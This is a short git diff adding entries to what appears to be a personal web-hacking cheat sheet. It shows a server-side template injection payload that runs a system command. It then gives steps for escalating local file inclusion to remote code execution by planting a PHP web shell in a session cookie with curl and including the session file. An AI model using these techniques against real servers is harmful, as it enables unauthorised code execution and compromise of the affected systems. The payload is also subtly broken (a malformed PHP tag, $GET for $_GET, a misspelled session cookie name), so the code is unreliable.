@@ -50,3 +50,18 @@ Check /jwks.json or /.well-known/jwks.json
 
 ---
   SSTI use ${<path>.os.popen("id").read()} 
+  
+---
+  
+if u have access to value PHPSSID and find `LFI` u have `RCE` 
+1- guess where save value of cookies `PHPSSID' dir 
+   > in common `/var/` or `/tmp`
+2- send php code in cookies like 
+  ```bash
+  curl example.com --cookie "Name=<php? system($GET['cmd']); ?>"
+  ```
+3- go to this dir and send parameter 
+  
+ ---
+  tips for lfi 
+  you can use $WEBROOT 
